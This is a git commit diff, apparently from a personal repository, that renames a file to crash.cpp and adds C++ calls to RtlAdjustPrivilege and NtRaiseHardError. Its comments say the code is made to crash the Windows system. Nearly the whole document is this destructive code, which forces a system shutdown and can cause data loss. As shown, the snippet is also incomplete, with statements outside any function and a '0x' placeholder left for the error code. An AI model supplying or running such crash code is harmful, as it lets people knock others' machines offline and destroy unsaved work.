e23f28c6501dea55a5be42c4a97f5386c692bfc2
tubercomi man <gseleniumepic5@gmail.com>
2024-10-15 17:14:05 +0200

    Update and rename ntstatus.cpp to crash.cpp

--- crash.cpp
+++ crash.cpp
@@ -2,3 +2,8 @@ EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, PBYTE);
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ntErrors, DWORD dwParams, DWORD dwUnicodeStringParamMask, PDWORD_PTR pDwParams, DWORD dwResponse, PDWORD pResponse);
 // this is the ntstatus define (made for crashing the system)
 // rewritten by Tubercomiosis (me)
+
+BYTE ntBool;
+DWORD rsp;
+RtlAdjustPrivilege(19, TRUE, FALSE, &ntBool);
+NtRaiseHardError(0x, 0, 0, 0, 6, &rsp); // replace 0x with an applicable NTSTATUS error code
